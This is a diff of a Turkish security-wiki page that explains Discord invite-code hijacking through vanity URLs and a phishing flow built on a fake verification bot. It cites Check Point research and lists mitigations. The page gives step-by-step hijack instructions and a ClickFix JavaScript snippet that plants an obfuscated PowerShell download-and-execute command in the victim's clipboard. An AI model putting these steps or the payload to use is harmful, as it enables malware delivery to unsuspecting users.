@@ -1,41 +1,41 @@
-# Discord Davet Hijacking
+# Discord Invite Hijacking
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Discord’un davet sistemi açığı, tehdit aktörlerinin süresi dolmuş veya silinmiş davet kodlarını (geçici, kalıcı veya özel vanity) herhangi bir Seviye 3 artırılmış sunucuda yeni vanity bağlantıları olarak talep etmesine olanak tanır. Tüm kodları küçük harfe normalize ederek, saldırganlar bilinen davet kodlarını önceden kaydedebilir ve orijinal bağlantı süresi dolduğunda veya kaynak sunucu artırmasını kaybettiğinde trafiği sessizce ele geçirebilirler.
+Discord’un davet sistemi vulnerability’si, threat actor’ların süresi dolmuş veya silinmiş davet kodlarını (temporary, permanent veya custom vanity) herhangi bir Level 3 Boost sunucusunda yeni vanity link’ler olarak claim etmesine olanak tanır. Tüm kodlar lowercase’e normalize edildiğinden, attacker’lar bilinen davet kodlarını önceden pre-register edebilir ve original link’in süresi dolduğunda veya kaynak sunucu boost’unu kaybettiğinde trafiği sessizce hijack edebilir.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Davet Türleri ve Ele Geçirme Riski
+## Invite Types and Hijack Risk
 
-| Davet Türü           | Ele Geçirilebilir mi? | Koşul / Yorumlar                                                                                       |
-|-----------------------|-----------------------|--------------------------------------------------------------------------------------------------------|
-| Geçici Davet Bağlantısı | ✅                    | Süresi dolduktan sonra, kod mevcut hale gelir ve artırılmış bir sunucu tarafından vanity URL olarak yeniden kaydedilebilir. |
-| Kalıcı Davet Bağlantısı | ⚠️                    | Silinirse ve yalnızca küçük harfler ve rakamlardan oluşuyorsa, kod tekrar mevcut hale gelebilir.        |
-| Özel Vanity Bağlantısı  | ✅                    | Orijinal sunucu Seviye 3 Boost'unu kaybederse, vanity daveti yeni kayıt için mevcut hale gelir.      |
+| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
+|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
+| Temporary Invite Link | ✅          | Süresi dolduktan sonra kod kullanılabilir hale gelir ve boosted bir sunucu tarafından vanity URL olarak yeniden register edilebilir. |
+| Permanent Invite Link | ⚠️          | Silinmişse ve yalnızca lowercase harfler ile rakamlardan oluşuyorsa kod yeniden kullanılabilir hale gelebilir.        |
+| Custom Vanity Link    | ✅          | Original sunucu Level 3 Boost’unu kaybederse vanity invite yeni registration için kullanılabilir hale gelir.    |
 
-## Sömürü Adımları
+## Exploitation Steps
 
-1. Keşif
-- `discord.gg/{code}` veya `discord.com/invite/{code}` desenine uyan davet bağlantılarını izlemek için kamu kaynaklarını (forumlar, sosyal medya, Telegram kanalları) takip edin.
-- İlginç davet kodlarını toplayın (geçici veya vanity).
-2. Ön Kayıt
-- Seviye 3 Boost ayrıcalıklarına sahip bir Discord sunucusu oluşturun veya mevcut bir sunucuyu kullanın.
-- **Sunucu Ayarları → Vanity URL** kısmında hedef davet kodunu atamayı deneyin. Kabul edilirse, kod kötü niyetli sunucu tarafından rezerve edilir.
-3. Ele Geçirme Aktivasyonu
-- Geçici davetler için, orijinal davetin süresi dolana kadar bekleyin (veya kaynağı kontrol ediyorsanız manuel olarak silin).
-- Büyük harf içeren kodlar için, küçük harfli versiyonu hemen talep edilebilir, ancak yönlendirme yalnızca süresi dolduktan sonra aktif olur.
-4. Sessiz Yönlendirme
-- Eski bağlantıyı ziyaret eden kullanıcılar, ele geçirme aktif olduğunda saldırgan kontrolündeki sunucuya sorunsuz bir şekilde yönlendirilir.
+1. Reconnaissance
+- Public sources (forums, social media, Telegram channels) üzerinde `discord.gg/{code}` veya `discord.com/invite/{code}` pattern’ine uyan invite link’lerini monitor edin.<sup>[[1]](#references)</sup>
+- İlgi çekici invite code’larını (temporary veya vanity) collect edin.
+2. Pre-registration
+- Level 3 Boost privileges’ına sahip bir Discord server oluşturun veya mevcut bir server kullanın.
+- **Server Settings → Vanity URL** bölümünde target invite code’unu assign etmeyi deneyin. Kabul edilirse kod malicious server tarafından reserve edilir.
+3. Hijack Activation
+- Temporary invite’ler için original invite’in süresi dolana kadar bekleyin (veya source’u control ediyorsanız manuel olarak silin).
+- Uppercase içeren code’lar için lowercase variant hemen claim edilebilir, ancak redirection yalnızca expiration sonrasında activate olur.
+4. Silent Redirection
+- Eski link’i ziyaret eden users, hijack active olduğunda seamless bir şekilde attacker-controlled server’a gönderilir.
 
-## Discord Sunucusu Üzerinden Phishing Akışı
+## Phishing Flow via Discord Server
 
-1. Sunucu kanallarını kısıtlayarak yalnızca bir **#verify** kanalının görünür olmasını sağlayın.
-2. Yeni gelenleri OAuth2 ile doğrulamaya yönlendirmek için bir bot (örneğin, **Safeguard#0786**) dağıtın.
-3. Bot, kullanıcıları bir CAPTCHA veya doğrulama adımı kılıfında bir phishing sitesine (örneğin, `captchaguard.me`) yönlendirir.
-4. **ClickFix** UX hilesini uygulayın:
-- Bozuk bir CAPTCHA mesajı gösterin.
-- Kullanıcıları **Win+R** diyalogunu açmaya, önceden yüklenmiş bir PowerShell komutunu yapıştırmaya ve Enter tuşuna basmaya yönlendirin.
+1. Server channels’larını yalnızca bir **#verify** channel’ı görünür olacak şekilde restrict edin.<sup>[[1]](#references)</sup>
+2. Yeni gelenleri OAuth2 üzerinden verify olmaya yönlendirmek için bir bot (ör. **Safeguard#0786**) deploy edin.
+3. Bot, users’ı CAPTCHA veya verification step görünümü altında bir phishing site’ına (ör. `captchaguard.me`) redirect eder.
+4. **ClickFix** UX trick’ini implement edin:
+- Bozuk bir CAPTCHA message’ı display edin.
+- Users’ı **Win+R** dialog’unu açmaya, önceden yüklenmiş bir PowerShell command’ını paste etmeye ve Enter’a basmaya yönlendirin.
 
-### ClickFix Panoya Enjeksiyon Örneği
+### ClickFix Clipboard Injection Example
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -44,18 +44,18 @@ const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9
 `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık UI öğelerini kullanır.
+Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık kullanıcı arayüzü öğelerinden yararlanır.<sup>[[1]](#references)</sup>
 
-## Önlemler
+## Azaltıcı Önlemler
 
-- En az bir büyük harf veya alfasayısal olmayan karakter içeren kalıcı davet bağlantıları kullanın (asla süresi dolmaz, yeniden kullanılmaz).
+- En az bir büyük harf veya alfasayısal olmayan karakter içeren kalıcı davet bağlantıları kullanın (süresi asla dolmayan, yeniden kullanılamayan).<sup>[[1]](#references)</sup>
 - Davet kodlarını düzenli olarak değiştirin ve eski bağlantıları iptal edin.
-- Discord sunucu destek durumunu ve vanity URL taleplerini izleyin.
-- Kullanıcıları sunucu kimliğini doğrulamaya ve panoya kopyalanmış komutları çalıştırmaktan kaçınmaya eğitin.
+- Discord sunucusunun boost durumunu ve vanity URL taleplerini izleyin.
+- Kullanıcıları sunucunun gerçekliğini doğrulamaları ve panodan yapıştırılan komutları çalıştırmaktan kaçınmaları konusunda bilinçlendirin.
 
 ## Referanslar
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
-- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
+- [1] [Güvenden Tehdide: Çok Aşamalı Malware Dağıtımı İçin Ele Geçirilen Discord Davetleri](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- [2] [Özel Davet Bağlantısı – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
 {{#include ../../banners/hacktricks-training.md}}
